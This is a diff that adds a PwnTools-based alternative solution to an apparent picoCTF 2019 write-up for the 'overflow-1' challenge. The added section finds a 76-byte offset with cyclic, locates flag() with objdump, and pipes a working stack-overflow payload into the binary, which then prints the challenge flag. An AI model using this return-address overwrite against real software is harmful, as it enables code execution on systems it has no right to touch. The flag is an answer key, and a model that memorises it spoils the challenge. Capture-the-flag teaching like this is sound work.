@@ -252,3 +252,44 @@ There we go. We overwrote the old value of the eip and now the program should te
 ## Flag
 
 `picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5a21b59fb}`
+
+## Alternative Solution - PwnTools
+
+To recap, `vuln` allocates a buffer of size `64` on the stack and then uses `gets` a vulnerable function to read from it.
+
+The first step is to calculate the amount of padding required from the beginning of the buffer all the way to the return address on the stack.
+
+Luckily for us, the program prints the return address where the program will be jumping back to. Let's use PwnTools `cyclic` module this.
+
+Visit this page to learn more on how to use it: [https://docs.pwntools.com/en/stable/util/cyclic.html](https://docs.pwntools.com/en/stable/util/cyclic.html)
+
+```bash
+samson@pico-2019-shell1:/problems/overflow-1$ cyclic 100
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+samson@pico-2019-shell1:/problems/overflow-1$ cyclic 100 | ./vuln
+Give me a string and lets see what happens: 
+Woah, were jumping to 0x61616174 !
+Segmentation fault (core dumped)
+```
+`61`, `61`, `61`, `74` - map to `a`, `a`, `a`, `t`.
+
+I see this pattern in that long string, but I really don't want to count it.
+
+```bash
+samson@pico-2019-shell1:/problems/overflow-1$ cyclic -l 0x61616174
+76
+```
+
+So we need 76 bytes of padding and then the address of the `flag()` function.
+
+```bash
+samson@pico-2019-shell1:/problems/overflow-1$ objdump -t vuln | grep flag
+080485e6 g     F .text  00000079              flag
+```
+
+```bash
+samson@pico-2019-shell1:/problems/overflow-1$ python -c "from pwn import *; print('A'*76 + p32(0x080485e6))" | ./vuln
+Give me a string and lets see what happens: 
+Woah, were jumping to 0x80485e6 !
+picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5a21b59fb}Segmentation fault (core dumped)
+```
